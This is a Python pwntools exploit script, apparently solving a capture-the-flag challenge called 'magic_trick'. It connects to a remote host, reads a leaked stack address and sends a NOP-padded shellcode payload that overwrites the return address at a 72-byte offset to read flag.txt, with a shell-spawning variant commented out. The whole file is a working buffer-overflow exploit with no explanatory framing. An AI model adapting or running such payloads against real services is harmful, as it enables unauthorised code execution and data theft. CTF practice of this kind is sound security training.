#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./magic_trick', checksec = False)
# p = process(elf.path)
p = remote('94.237.56.76', 36029)
context.log_level = 'debug'

offset = 72  # found with pwndbg
p.recvuntil("The number is '")
address = int(p.recvuntil("'")[:-1], 16)
info(p64(address))

shellcode = asm(shellcraft.popad())
# shellcode = asm(shellcraft.sh())
shellcode += asm(shellcraft.cat('flag.txt'))
padding = asm('nop') * (offset - len(shellcode))

payload = flat(
			padding,
			shellcode,
			address,
				)

p.recvuntil('>>')
p.sendline('y')
p.recvuntil('>>')
p.send(payload)
p.interactive()
